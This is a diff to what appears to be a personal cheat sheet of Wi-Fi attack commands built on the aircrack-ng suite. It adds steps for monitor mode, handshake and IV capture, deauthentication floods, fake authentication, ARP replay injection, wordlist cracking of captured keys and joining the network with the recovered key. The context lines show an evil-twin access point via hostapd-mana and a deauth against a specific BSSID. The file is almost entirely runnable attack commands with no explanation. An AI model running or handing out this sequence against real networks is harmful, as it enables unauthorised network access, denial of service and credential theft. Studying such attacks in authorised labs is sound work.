@@ -1,18 +1,26 @@
 $ sudo airmon-ng start <wireless interface>
-
-
+ifconfig
+iwconfig
+airmong-ng start wlan0
+airodump-ng wlan0mon
 $ sudo airodump-ng <wireless interface>
 
 
 $ sudo airodump-ng -c <channel> --bssid <BSSID> -w <output file> <wireless interface>
+airodump-ng --bssid <BSSID> -c <CHANNEL> -w <CAPTURE_FILE> wlan0mon
+
 $ airodump-ng -c <channel> --ivs -w <output file> --output-format pcap <wireless interface>
 
 
 $ sudo aireplay-ng -3 -b <BSSID> -h <your MAC address> <wireless interface>
 
+aireplay-ng -0 0 -a <BSSID> wlan0mon
+aireplay-ng -1 6 -e <SSID> -a <BSSID> -h <CLIENT MAC> wlan0mon
+aireplay-ng -3 -b <BSSID> -h <CLIENT MAC> wlan0mon
+
 
 $ sudo aircrack-ng <output file>.cap
-
+aircrack-ng <CAPTURE_FILE>
 
 nano wpa_supplicant.conf
 
@@ -71,4 +79,8 @@ sudo hostapd-mana Mostar-mana.conf
 
 sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
 
-aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+$ aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+
+iwconfig wlan0mon essid <SSID> key s:<KEY>
+dhclient wlan0mon
+
